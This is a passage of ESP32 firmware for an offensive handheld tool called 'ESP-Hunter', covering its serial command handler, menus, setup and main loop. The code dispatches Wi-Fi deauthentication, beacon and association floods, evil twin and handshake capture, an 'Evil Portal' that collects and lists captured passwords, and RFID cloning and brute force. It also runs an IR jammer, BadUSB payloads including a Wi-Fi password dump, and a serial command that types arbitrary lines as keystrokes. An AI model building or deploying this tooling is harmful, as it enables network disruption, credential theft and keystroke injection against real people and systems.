  String cmd = Serial.readStringUntil('\n');
  cmd.trim();

  // --- Обработка загрузки payload на SD ---
  static String payloadBuffer = "";
  
  if (cmd == "CMD:WRITE_PAYLOAD_START") {
    payloadBuffer = "";
    Serial.println("PAYLOAD_START_OK");
    return;
  }
  if (cmd.startsWith("PAYLOAD_LINE:")) {
    String line = cmd.substring(13);
    payloadBuffer += line + "\n";
    return;
  }
  if (cmd == "CMD:WRITE_PAYLOAD_END") {
    if (isSdCardAvailable) {
      digitalWrite(TFT_CS, HIGH);
      digitalWrite(SD_CS, LOW);
      File f = SD.open("/payload.txt", FILE_WRITE);
      if (f) {
        f.print(payloadBuffer);
        f.close();
        Serial.println("PAYLOAD_SAVED");
      } else {
        Serial.println("PAYLOAD_SAVE_FAIL");
      }
      digitalWrite(SD_CS, HIGH);
    } else {
      Serial.println("SD_NOT_AVAILABLE");
    }
    payloadBuffer = "";
    return;
  }

  // --- Команда для выполнения строки как HID ---
  if (cmd.startsWith("CMD:EXECUTE_LINE:")) {
    String line = cmd.substring(16);
    if (isUsbHidReady) {
      Keyboard.print(line);
      Keyboard.write(KEY_RETURN);
    }
    Serial.println("EXECUTED");
    return;
  }

  // --- Старые команды ---
  if (!cmd.startsWith("CMD:")) return;
  String command = cmd.substring(4);
  command.trim();
  if (command == "BTN_UP") {
    btnUp.pressedEvent = true;
  } else if (command == "BTN_DOWN") {
    btnDown.pressedEvent = true;
  } else if (command == "BTN_OK") {
    btnOk.pressedEvent = true;
  } else if (command == "BTN_ESC") {
    btnEsc.pressedEvent = true;
  } else if (command == "GET_SCREEN") {
    sendScreenData();
  }
}

// ======================================================================
// 15. RENDER И LOOP (с оптимизациями)
// ======================================================================
void renderCurrentActivePage() {
  switch (activeCurrentPage) {
    case 0: // Display
      if (displaySubPage == 0) drawDisplaySubMenu();
      else if (displaySubPage == 1) drawRotationPage();
      else if (displaySubPage == 2) drawColorPage();
      else if (displaySubPage == 3) drawBrightnessPage();
      else if (displaySubPage == 4) drawBuzzerPage();
      break;
    case 1: // Pong
      if (gamesCurrentSubPage == 0) resetPongGameState();
      break;
    case 2: // IR (Вернули!)
      if (irCurrentSubPage == 0) drawGenericSubMenu("IR HUB", irSubMenuItemsText, IR_MENU_COUNT, irSubMenuIndex, irSubMenuScrollOffset);
      else if (irCurrentSubPage == 1) drawIrConsolePage();
      else if (irCurrentSubPage == 2) runClassicTvBGoneLoop();
      else if (irCurrentSubPage == 3) runIrJammer();
      else if (irCurrentSubPage == 4) drawIrSavedListPage();
      break;
    case 3: // RFID
      if (rfidCurrentSubPage == 0) drawGenericSubMenu("RFID PN532", rfidSubMenuItemsText, RFID_MENU_COUNT, rfidSubMenuIndex, rfidSubMenuScrollOffset);
      else if (rfidCurrentSubPage == 1) drawRfidReadPage();
      else if (rfidCurrentSubPage == 2) emulateActiveRfidUid();
      else if (rfidCurrentSubPage == 3) drawRfidWriteUidPage();
      else if (rfidCurrentSubPage == 4) drawRfidWriteCustomBlockPage();
      else if (rfidCurrentSubPage == 5) drawRfidErasePage();
      else if (rfidCurrentSubPage == 6) drawSavedRfidPage();
      else if (rfidCurrentSubPage == 7) bruteForceRfid();
      break;
    case 4: // Wi-Fi
      if (wirelessCurrentSubPage == 0) {
        drawGenericSubMenu("WIRELESS TOOLS", wirelessSubMenuItemsText, WIRELESS_MENU_COUNT, wirelessSubMenuIndex, wirelessSubMenuScrollOffset);
      } else if (wirelessCurrentSubPage == 1) {
        drawWiFiScanPage();
      } else if (wifiAttackSubPage == 1) {
        drawAttackChoiceMenu();
      } else if (wirelessCurrentSubPage == 9) {
        drawRadarPage();
      } else if (wirelessCurrentSubPage == 10) {
        drawWiFiSettingsPage();
      }
      break;
    case 5: // SD Card
      drawSdInfoPage();
      break;
    case 6: // About
      drawAboutSystemPage();
      break;
    case 7: // BadUSB
      if (badUsbCurrentSubPage == 0) drawGenericSubMenu("BADUSB RUNNER", badUsbSubMenuItemsText, BADUSB_MENU_COUNT, badUsbSubMenuIndex, badUsbSubMenuScrollOffset);
      break;
    case 8: // Evil Portal
      if (evilPortalCurrentSubPage == 0) drawGenericSubMenu("EVIL PORTAL", evilPortalSubMenuItemsText, EVIL_PORTAL_MENU_COUNT, evilPortalSubMenuIndex, evilPortalSubMenuScrollOffset);
      else if (evilPortalCurrentSubPage == 1) drawPortalSsidSelectPage();
      else if (evilPortalCurrentSubPage == 2) drawEvilPortalPage();
      else if (evilPortalCurrentSubPage == 3) capturedpasswords();
      break;
    case 9: // Web Remote
      runWebServerMode();
      break;
    default:
      drawMainNavigatorMenu();
      break;
  }
}

void setup() {
  
  Serial.begin(115200);
  Serial.println("\n=== ESP-Hunter START ===");

  Keyboard.begin(); Mouse.begin(); USB.begin(); isUsbHidReady = true; 
  
  

  
  


  

  SPI.begin(TFT_SCLK, SD_MISO, TFT_MOSI, -1);
  
  tft.initR(INITR_144GREENTAB);
  
  tft.fillScreen(COLOR_BLACK);

      pinMode(BACKLIGHT_PIN, OUTPUT);
  backlightAvailable = true;
  analogWrite(BACKLIGHT_PIN, 128);


  pinMode(SD_CS, OUTPUT);
  digitalWrite(SD_CS, HIGH);
  pinMode(TFT_CS, OUTPUT);
  digitalWrite(TFT_CS, HIGH);

    pinMode(TFT_RST, OUTPUT);
  digitalWrite(TFT_RST, HIGH);
  
  digitalWrite(TFT_RST, LOW);
  
  digitalWrite(TFT_RST, HIGH);

  tft.fillScreen(COLOR_BLACK);
  tft.setRotation(currentRotation);
  canvas.fillScreen(COLOR_BLACK);
  canvasFlush();
  

  pinMode(BTN_UP, INPUT_PULLUP);
  pinMode(BTN_DOWN, INPUT_PULLUP);
  pinMode(BTN_OK, INPUT_PULLUP);
  pinMode(BTN_ESC, INPUT_PULLUP);

  pinMode(BUZZER_PIN, OUTPUT);
  initBuzzer();


  pinMode(IR_TX_PIN, OUTPUT);
  digitalWrite(IR_TX_PIN, LOW);
  isIrTxReady = true;
  pinMode(IR_RX_PIN, INPUT_PULLUP);
  isIrRxReady = (digitalRead(IR_RX_PIN) == HIGH);

  preferences.begin("rfid_store", false);
  loadSystemSettings();
  irsend.begin();
  irrecv.enableIRIn();

  initializeSdCardStorage();
  initializeRfidHardware();

  radar.init();
  randomSeed(esp_random());
  

  // Заставка
  
  canvas.fillScreen(COLOR_BLACK);
  canvas.drawRect(2, 2, 124, 124, accentColor);
  canvas.setTextWrap(false);
  canvas.setTextSize(1);
  canvas.setTextColor(accentColor);
  canvas.setCursor(10, 10);
  canvas.print(">_ ESP-Hunter");
  canvas.drawBitmap(15, 20, skull_bitmap_64x64, 110, 95, accentColor);
  canvas.setTextColor(COLOR_WHITE);
  canvas.setCursor(10, 110);
  canvas.printf("SD:%s PN532:%s", isSdCardAvailable ? "OK" : "NO", isRfidAvailable ? "OK" : "NO");
  canvasFlush();
  playSplashMelody();
  delay(3000);
  
  redrawFlag = true;
}

void loop() {
  updateBuzzer();
  processSerialCommands();

  // Оптимизация: обновляем кнопки с автоповтором
  updateButton(btnUp, true);
  updateButton(btnDown, true);
  updateButton(btnOk, false);
  updateButton(btnEsc, false);

  bool isUpPressed   = getButtonPress(btnUp);
  bool isDownPressed = getButtonPress(btnDown);
  bool isOkPressed   = getButtonPress(btnOk);
  bool isEscPressed  = getButtonPress(btnEsc);


if (isUpPressed) playBeep(800, 60);
if (isDownPressed) playBeep(800, 60);
if (isOkPressed) playBeep(800, 60);
if (isEscPressed) playBeep(800, 60);

  // IR обработка (не блокирующая)
  processIrRxTask();

  // Фоновые задачи (только если активны)
  if (activeCurrentPage == 4 && wirelessCurrentSubPage == 2) tickBeaconSpamTask();
  if (activeCurrentPage == 4 && wirelessCurrentSubPage == 1) runDeauthTick();

  // Игра Pong
  if (activeCurrentPage == 1 && gamesCurrentSubPage == 0) {
    if (millis() - lastArcadeGameTick > 30) {
      lastArcadeGameTick = millis();
      renderPongGameLoop(isUpPressed, isDownPressed, isOkPressed);
    }
    if (isOkPressed && pongState.gameOver) resetPongGameState();
    if (isEscPressed) {
      activeCurrentPage = -1;
      redrawFlag = true;
    }
    return; // чтобы не рисовать меню поверх игры
  }

  // Ограничение частоты перерисовки (20 кадров/сек)
  if (redrawFlag && (millis() - lastRedrawTime >= REDRAW_INTERVAL)) {
    lastRedrawTime = millis();
    renderCurrentActivePage();
    redrawFlag = false;
  }

  // ---- ГЛАВНОЕ МЕНЮ ----
  if (activeCurrentPage == -1) {
    if (isUpPressed) {
      activeMainMenuItem = (activeMainMenuItem <= 0) ? MAIN_MENU_COUNT - 1 : activeMainMenuItem - 1;
      redrawFlag = true;
    }
    if (isDownPressed) {
      activeMainMenuItem = (activeMainMenuItem >= MAIN_MENU_COUNT - 1) ? 0 : activeMainMenuItem + 1;
      redrawFlag = true;
    }
    if (isOkPressed) {
      if (activeMainMenuItem == 9) { // Web Remote
        runWebServerMode();
        activeCurrentPage = -1;
        redrawFlag = true;
      } else {
        activeCurrentPage = activeMainMenuItem;
        // Сброс подстраниц
        gamesCurrentSubPage = 0;
        rfidCurrentSubPage = 0;
        rfidSubMenuIndex = 0;
        irCurrentSubPage = 0;
        irSubMenuIndex = 0;
        wirelessCurrentSubPage = 0;
        wirelessSubMenuIndex = 0;
        badUsbCurrentSubPage = 0;
        badUsbSubMenuIndex = 0;
        evilPortalCurrentSubPage = 0;
        evilPortalSubMenuIndex = 0;
        savedIrSelected = 0;
        savedIrScroll = 0;
        marqueeOffset = 0;
        displaySubPage = 0;
        displaySubMenuIndex = 0;
        displaySubMenuScrollOffset = 0;
        wifiAttackSubPage = 0;
        redrawFlag = true;
        if (activeCurrentPage == 2) {
          pinMode(IR_RX_PIN, INPUT);
          irrecv.enableIRIn();
        }
      }
    }
    return;
  }
  // ===== Обработка страницы Wi-Fi (4) =====
  if (activeCurrentPage == 4) {
    if (wirelessCurrentSubPage == 0) {
      if (isUpPressed) {
        wirelessSubMenuIndex = (wirelessSubMenuIndex <= 0) ? WIRELESS_MENU_COUNT - 1 : wirelessSubMenuIndex - 1;
        redrawFlag = true;
      }
      if (isDownPressed) {
        wirelessSubMenuIndex = (wirelessSubMenuIndex >= WIRELESS_MENU_COUNT - 1) ? 0 : wirelessSubMenuIndex + 1;
        redrawFlag = true;
      }
      if (isOkPressed) {
        if (wirelessSubMenuIndex == 0) {
          wirelessCurrentSubPage = 1;
          wifiAttackSubPage = 0;
          redrawFlag = true;
        } else if (wirelessSubMenuIndex == 9) {    // Radar Mode
          wirelessCurrentSubPage = 9;
          redrawFlag = true;
        } else if (wirelessSubMenuIndex == 10) {   // Settings
          wirelessCurrentSubPage = 10;
          redrawFlag = true;
        } else {
          switch (wirelessSubMenuIndex) {
            case 1: runDeauthAttack(true); break;
            case 2: runBeaconAttack(false); break;
            case 3: if (wifiSelectedIndex >= 0 && wifiSelectedIndex < wifiScannedCount) runBeaconAttack(true); else showPopup("Select target first"); break;
            case 4: if (wifiSelectedIndex >= 0 && wifiSelectedIndex < wifiScannedCount) runAssocAuthAttack(false); else showPopup("Select target first"); break;
            case 5: if (wifiSelectedIndex >= 0 && wifiSelectedIndex < wifiScannedCount) runAssocAuthAttack(true); else showPopup("Select target first"); break;
            case 6: if (wifiSelectedIndex >= 0 && wifiSelectedIndex < wifiScannedCount) runEvilTwin(); else showPopup("Select target first"); break;
            case 7: runSourApple(); break;
            case 8: if (wifiSelectedIndex >= 0 && wifiSelectedIndex < wifiScannedCount) captureHandshake(wifiSelectedIndex); else showPopup("Select target first"); break;
          }
          redrawFlag = true;
        }
      }
      if (isEscPressed) {
        activeCurrentPage = -1;
        redrawFlag = true;
        return;
      }
    } else if (wirelessCurrentSubPage == 1) {
      // Страница сканирования Wi-Fi
      if (isUpPressed && wifiScannedCount > 0) {
        wifiSelectedIndex = (wifiSelectedIndex <= 0) ? wifiScannedCount - 1 : wifiSelectedIndex - 1;
        redrawFlag = true;
      }
      if (isDownPressed) {
        if (wifiScannedCount > 0) {
          wifiSelectedIndex = (wifiSelectedIndex >= wifiScannedCount - 1) ? 0 : wifiSelectedIndex + 1;
          redrawFlag = true;
        } else {
          executeWiFiScan();
        }
      }
      if (isOkPressed && wifiScannedCount > 0) {
        wifiAttackSubPage = 1;
        wifiAttackChoice = 0;
        wifiAttackScroll = 0;
        redrawFlag = true;
      }
      if (isEscPressed) {
        wirelessCurrentSubPage = 0;
        redrawFlag = true;
      }
    } else if (wifiAttackSubPage == 1) {
      // Меню выбора атаки для выбранной сети
      if (isUpPressed) {
        wifiAttackChoice = (wifiAttackChoice <= 0) ? ATTACK_CHOICE_COUNT - 1 : wifiAttackChoice - 1;
        redrawFlag = true;
      }
      if (isDownPressed) {
        wifiAttackChoice = (wifiAttackChoice >= ATTACK_CHOICE_COUNT - 1) ? 0 : wifiAttackChoice + 1;
        redrawFlag = true;
      }
      if (isOkPressed) {
        switch (wifiAttackChoice) {
          case 0: runDeauthAttack(false); break;
          case 1: runBeaconAttack(false); break;
          case 2: runBeaconAttack(true); break;
          case 3: runAssocAuthAttack(false); break;
          case 4: runAssocAuthAttack(true); break;
          case 5: runEvilTwin(); break;
          case 6: runSourApple(); break;
          case 7: captureHandshake(wifiSelectedIndex); break;
        }
        wifiAttackSubPage = 0;
        wirelessCurrentSubPage = 1;
        redrawFlag = true;
      }
      if (isEscPressed) {
        wifiAttackSubPage = 0;
        wirelessCurrentSubPage = 1;
        redrawFlag = true;
      }
    } else if (wirelessCurrentSubPage == 9) {   // Radar Mode
      // Функция drawRadarPage() сама закроет цикл и вернёт управление, 
      // но после выхода нужно сбросить флаги
      drawRadarPage();
      wirelessCurrentSubPage = 0;
      wifiAttackSubPage = 0;
      redrawFlag = true;
    } else if (wirelessCurrentSubPage == 10) {  // Settings
      if (isUpPressed) {
        if (wifiEditValue) {
          int* ptr = nullptr;
          switch (wifiSettingsSelected) {
            case 0: ptr = &framesPerDeauth; break;
            case 1: ptr = &sendDelay; break;
            case 2: ptr = &framesPerBeacon; break;
            case 3: ptr = &maxClone; break;
            case 4: ptr = &maxSpamSpace; break;
          }
          if (ptr) (*ptr)++;
        } else {
          wifiSettingsSelected = (wifiSettingsSelected <= 0) ? 4 : wifiSettingsSelected - 1;
        }
        redrawFlag = true;
      }
      if (isDownPressed) {
        if (wifiEditValue) {
          int* ptr = nullptr;
          switch (wifiSettingsSelected) {
            case 0: ptr = &framesPerDeauth; break;
            case 1: ptr = &sendDelay; break;
            case 2: ptr = &framesPerBeacon; break;
            case 3: ptr = &maxClone; break;
            case 4: ptr = &maxSpamSpace; break;
          }
          if (ptr && *ptr > 0) (*ptr)--;
        } else {
          wifiSettingsSelected = (wifiSettingsSelected >= 4) ? 0 : wifiSettingsSelected + 1;
        }
        redrawFlag = true;
      }
      if (isOkPressed) {
        wifiEditValue = !wifiEditValue;
        redrawFlag = true;
      }
      if (isEscPressed) {
        wirelessCurrentSubPage = 0;
        wifiEditValue = false;
        redrawFlag = true;
      }
    }
  } // <-- ЗАКРЫТИЕ if (activeCurrentPage == 4)

  // Обработка страницы Display (0)
  if (activeCurrentPage == 0) {
    if (displaySubPage == 0) {
      if (isUpPressed) {
        displaySubMenuIndex = (displaySubMenuIndex <= 0) ? DISPLAY_SUB_MENU_COUNT - 1 : displaySubMenuIndex - 1;
        redrawFlag = true;
      }
      if (isDownPressed) {
        displaySubMenuIndex = (displaySubMenuIndex >= DISPLAY_SUB_MENU_COUNT - 1) ? 0 : displaySubMenuIndex + 1;
        redrawFlag = true;
      }
      if (isOkPressed) {
        displaySubPage = displaySubMenuIndex + 1;
        redrawFlag = true;
      }
      if (isEscPressed) {
        activeCurrentPage = -1;
        redrawFlag = true;
        return;
      }
    } else if (displaySubPage == 1) {
      if (isUpPressed) {
        currentRotation = (currentRotation + 1) % 4;
        applyRotation(currentRotation);
        redrawFlag = true;
      }
      if (isDownPressed) {
        currentRotation = (currentRotation == 0) ? 3 : currentRotation - 1;
        applyRotation(currentRotation);
        redrawFlag = true;
      }
      if (isOkPressed) {
        saveSystemSettings();
        displaySubPage = 0;
        redrawFlag = true;
      }
      if (isEscPressed) {
        applyRotation(preferences.getUChar("rotation", 0));
        currentRotation = preferences.getUChar("rotation", 0);
        displaySubPage = 0;
        redrawFlag = true;
      }
    } else if (displaySubPage == 2) {
      if (isUpPressed) {
        selectedColorIndex = (selectedColorIndex + 1) % COLOR_COUNT;
        accentColor = colorValuesList[selectedColorIndex];
        redrawFlag = true;
      }
      if (isDownPressed) {
        selectedColorIndex = (selectedColorIndex == 0) ? COLOR_COUNT - 1 : selectedColorIndex - 1;
        accentColor = colorValuesList[selectedColorIndex];
        redrawFlag = true;
      }
      if (isOkPressed) {
        saveSystemSettings();
        displaySubPage = 0;
        redrawFlag = true;
      }
      if (isEscPressed) {
        selectedColorIndex = preferences.getUChar("colorIdx", 1) % COLOR_COUNT;
        accentColor = colorValuesList[selectedColorIndex];
        displaySubPage = 0;
        redrawFlag = true;
      }
    } else if (displaySubPage == 3) {
      if (isUpPressed) {
        if (backlightBrightness < 255) backlightBrightness += 5;
        if (backlightBrightness > 255) backlightBrightness = 255;
        setBacklight(backlightBrightness);
        saveSystemSettings();
        redrawFlag = true;
      }
      if (isDownPressed) {
        if (backlightBrightness > 5) backlightBrightness -= 5;
        else backlightBrightness = 0;
        setBacklight(backlightBrightness);
        saveSystemSettings();
        redrawFlag = true;
      }
      if (isOkPressed) {
        saveSystemSettings();
        displaySubPage = 0;
        redrawFlag = true;
      }
      if (isEscPressed) {
        backlightBrightness = preferences.getUChar("brightness", 128);
        setBacklight(backlightBrightness);
        displaySubPage = 0;
        redrawFlag = true;
      }
    }
               else if (displaySubPage == 4) {
  if (isUpPressed) {
    if (buzzerVolume < 255) buzzerVolume += 15;
    if (buzzerVolume > 255) buzzerVolume = 255;
    if (buzzerEnabled && buzzerVolume > 0) playBeep(1500, 30, buzzerVolume);
    redrawFlag = true;
  }
  if (isDownPressed) {
    if (buzzerVolume > 0) buzzerVolume -= 15;
    else buzzerVolume = 0;
    if (buzzerEnabled && buzzerVolume > 0) playBeep(1500, 30, buzzerVolume);
    redrawFlag = true;
  }
  if (isOkPressed) {
    buzzerEnabled = !buzzerEnabled;
    // Если только что включили - принудительно пикаем максимально громко
    if (buzzerEnabled) playBeep(2000, 100, 255); 
    redrawFlag = true;
  }
  if (isEscPressed) {
    saveSystemSettings();
    displaySubPage = 0;
    redrawFlag = true;
  }
}
    

    if (isEscPressed) { activeCurrentPage = -1; redrawFlag = true; return; }
    return;
  } 
  // Обработка страницы IR (2)
  if (activeCurrentPage == 2) {
    if (irCurrentSubPage == 0) {
      if (isUpPressed) {
        irSubMenuIndex = (irSubMenuIndex <= 0) ? IR_MENU_COUNT - 1 : irSubMenuIndex - 1;
        redrawFlag = true;
      }
      if (isDownPressed) {
        irSubMenuIndex = (irSubMenuIndex >= IR_MENU_COUNT - 1) ? 0 : irSubMenuIndex + 1;
        redrawFlag = true;
      }
      if (isOkPressed) {
        irCurrentSubPage = irSubMenuIndex + 1;
        if (irCurrentSubPage == 4) loadIrSignalList();
        if (irCurrentSubPage == 3) irJammerActive = true;
        redrawFlag = true;
      }
    } else if (irCurrentSubPage == 1) {
      if (isUpPressed) saveIrSignalToSdList(activeIrSignal.type, activeIrSignal.value, activeIrSignal.bits);
      else if (isDownPressed) saveCapturedIrLogToSd();
      else if (isOkPressed) transmitCapturedIrSignal();
    } else if (irCurrentSubPage == 2) {
      if (isOkPressed) runClassicTvBGoneLoop();
    } else if (irCurrentSubPage == 4) {
      if (isUpPressed && savedIrCount > 0) {
        savedIrSelected = (savedIrSelected <= 0) ? savedIrCount - 1 : savedIrSelected - 1;
        redrawFlag = true;
      }
      if (isDownPressed && savedIrCount > 0) {
        savedIrSelected = (savedIrSelected >= savedIrCount - 1) ? 0 : savedIrSelected + 1;
        redrawFlag = true;
      }
      if (isOkPressed) sendIrSavedSignal(savedIrSelected);
    }
    if (isEscPressed) {
      if (irCurrentSubPage > 0) {
        irCurrentSubPage = 0;
        redrawFlag = true;
      } else {
        activeCurrentPage = -1;
        redrawFlag = true;
      }
      return;
    }
  }
    
  

  // Обработка страницы RFID (3)
  if (activeCurrentPage == 3) {
    if (rfidCurrentSubPage == 0) {
      if (isUpPressed) {
        rfidSubMenuIndex = (rfidSubMenuIndex <= 0) ? RFID_MENU_COUNT - 1 : rfidSubMenuIndex - 1;
        redrawFlag = true;
      }
      if (isDownPressed) {
        rfidSubMenuIndex = (rfidSubMenuIndex >= RFID_MENU_COUNT - 1) ? 0 : rfidSubMenuIndex + 1;
        redrawFlag = true;
      }
      if (isOkPressed) {
        rfidCurrentSubPage = rfidSubMenuIndex + 1;
        redrawFlag = true;
      }
    } else if (rfidCurrentSubPage == 1) {
      if (isOkPressed) executeRfidTagScan();
      if (isDownPressed) saveActiveRfidToStorage();
    } else if (rfidCurrentSubPage == 2) {
      emulateActiveRfidUid();
      rfidCurrentSubPage = 0;
      redrawFlag = true;
    } else if (rfidCurrentSubPage == 3) {
      if (isOkPressed) writeUidToCuidTag();
    } else if (rfidCurrentSubPage == 4) {
      if (isUpPressed) {
        activeRfidBlock = (activeRfidBlock >= 15) ? 1 : activeRfidBlock + 1;
        redrawFlag = true;
      }
      if (isDownPressed) {
        activeRfidBlock = (activeRfidBlock <= 1) ? 15 : activeRfidBlock - 1;
        redrawFlag = true;
      }
      if (isOkPressed) writeDataToCustomBlock();
    } else if (rfidCurrentSubPage == 5) {
      if (isUpPressed) {
        activeRfidBlock = (activeRfidBlock >= 15) ? 1 : activeRfidBlock + 1;
        redrawFlag = true;
      }
      if (isDownPressed) {
        activeRfidBlock = (activeRfidBlock <= 1) ? 15 : activeRfidBlock - 1;
        redrawFlag = true;
      }
      if (isOkPressed) eraseDataOnCustomBlock();
    } else if (rfidCurrentSubPage == 6) {
      if (isUpPressed) {
        rfidSavedSlotIndex = (rfidSavedSlotIndex <= 0) ? RFID_SLOTS_MAX - 1 : rfidSavedSlotIndex - 1;
        redrawFlag = true;
      }
      if (isDownPressed) {
        rfidSavedSlotIndex = (rfidSavedSlotIndex >= RFID_SLOTS_MAX - 1) ? 0 : rfidSavedSlotIndex + 1;
        redrawFlag = true;
      }
      if (isOkPressed) {
        readSavedUidFromFlash(rfidSavedSlotIndex, activeRfidUidHex, sizeof(activeRfidUidHex));
        if (activeRfidUidHex[0] != '\0') {
          drawHeaderBar("SELECTED!");
          canvas.setTextColor(COLOR_GREEN);
          canvas.setCursor(5, 50);
          canvas.printf("Active UID: %s", activeRfidUidHex);
          canvasFlush();
          delay(1000);
        }
        redrawFlag = true;
      }
    }
    if (isEscPressed) {
      if (rfidCurrentSubPage > 0) {
        rfidCurrentSubPage = 0;
        redrawFlag = true;
      } else {
        activeCurrentPage = -1;
        redrawFlag = true;
      }
      return;
    }
  }

  // Обработка страницы BadUSB (7)
  if (activeCurrentPage == 7) {
    if (badUsbCurrentSubPage == 0) {
      if (isUpPressed) {
        badUsbSubMenuIndex = (badUsbSubMenuIndex <= 0) ? BADUSB_MENU_COUNT - 1 : badUsbSubMenuIndex - 1;
        marqueeOffset = 0;
        redrawFlag = true;
      }
      if (isDownPressed) {
        badUsbSubMenuIndex = (badUsbSubMenuIndex >= BADUSB_MENU_COUNT - 1) ? 0 : badUsbSubMenuIndex + 1;
        marqueeOffset = 0;
        redrawFlag = true;
      }
      if (isOkPressed) {
        switch (badUsbSubMenuIndex) {
          case 0: runBadUsbDemoNotepad(); break;
          case 1: runBadUsbDemoTerminal(); break;
          case 2: executeDuckyScriptFromSd(); break;
          case 3: runBadUsbCustomString("I HACK YOU!"); break;
          case 4: runBadUsbShutdown(); break;
          case 5: runBadUsbWallpaper(); break;
          case 6: runBadUsbDisableIcons(); break;
          case 7: runBadUsbDumpWifi(); break;
          case 8: ensureEnglishLayout(); break;
        }
        redrawFlag = true;
      }
    }
    if (isEscPressed) {
      activeCurrentPage = -1;
      redrawFlag = true;
      return;
    }
  }

  // Обработка страницы Evil Portal (8)
  if (activeCurrentPage == 8) {
    if (evilPortalCurrentSubPage == 0) {
      if (isUpPressed) {
        evilPortalSubMenuIndex = (evilPortalSubMenuIndex <= 0) ? EVIL_PORTAL_MENU_COUNT - 1 : evilPortalSubMenuIndex - 1;
        marqueeOffset = 0;
        redrawFlag = true;
      }
      if (isDownPressed) {
        evilPortalSubMenuIndex = (evilPortalSubMenuIndex >= EVIL_PORTAL_MENU_COUNT - 1) ? 0 : evilPortalSubMenuIndex + 1;
        marqueeOffset = 0;
        redrawFlag = true;
      }
      if (isOkPressed) {
        if (evilPortalSubMenuIndex == 0) {
          evilPortalCurrentSubPage = 2;
          startEvilPortalService();
        } else if (evilPortalSubMenuIndex == 1) {
          evilPortalCurrentSubPage = 1;
          wifiScannedCount = 0;
          redrawFlag = true;
        } else if (evilPortalSubMenuIndex == 2) {
          evilPortalCurrentSubPage = 3;
          capturedScrollOffset = 0;
          capturedSelectedIndex = 0;
          marqueeOffset = 0;
          loadCapturedCredentials();
          redrawFlag = true;
        }
      }
    } else if (evilPortalCurrentSubPage == 1) {
      if (isUpPressed && wifiScannedCount > 0) {
        portalSsidIndex = (portalSsidIndex <= 0) ? wifiScannedCount - 1 : portalSsidIndex - 1;
        redrawFlag = true;
      }
      if (isDownPressed && wifiScannedCount > 0) {
        portalSsidIndex = (portalSsidIndex >= wifiScannedCount - 1) ? 0 : portalSsidIndex + 1;
        redrawFlag = true;
      }
      if (isOkPressed && wifiScannedCount > 0) {
        snprintf(evilPortalSsid, sizeof(evilPortalSsid), "%s", WiFi.SSID(portalSsidIndex).c_str());
        evilPortalCurrentSubPage = 2;
        startEvilPortalService();
      }
    } else if (evilPortalCurrentSubPage == 2) {
      if (isOkPressed && !isEvilPortalRunning) startEvilPortalService();
    } else if (evilPortalCurrentSubPage == 3) {
      if (isUpPressed && capturedCredCount > 0) {
        if (capturedSelectedIndex > 0) capturedSelectedIndex--;
        else capturedSelectedIndex = capturedCredCount - 1;
        redrawFlag = true;
      }
      if (isDownPressed && capturedCredCount > 0) {
        if (capturedSelectedIndex < capturedCredCount - 1) capturedSelectedIndex++;
        else capturedSelectedIndex = 0;
        redrawFlag = true;
      }
    }
    if (isEscPressed) {
      if (evilPortalCurrentSubPage > 0) {
        evilPortalCurrentSubPage = 0;
        redrawFlag = true;
      } else {
        isEvilPortalRunning = false;
        activeCurrentPage = -1;
        redrawFlag = true;
      }
      return;
    }
  }

  

  // Обработка страниц SD, About, Web Remote и т.д. (возврат по ESC)
  if (isEscPressed && activeCurrentPage != 0 && activeCurrentPage != 1 &&
      activeCurrentPage != 2 && activeCurrentPage != 3 &&
      activeCurrentPage != 4 && activeCurrentPage != 7 && activeCurrentPage != 8 && activeCurrentPage != 10) {
    activeCurrentPage = -1;
    redrawFlag = true;
  }

   yield();
  updateBuzzer(); 
}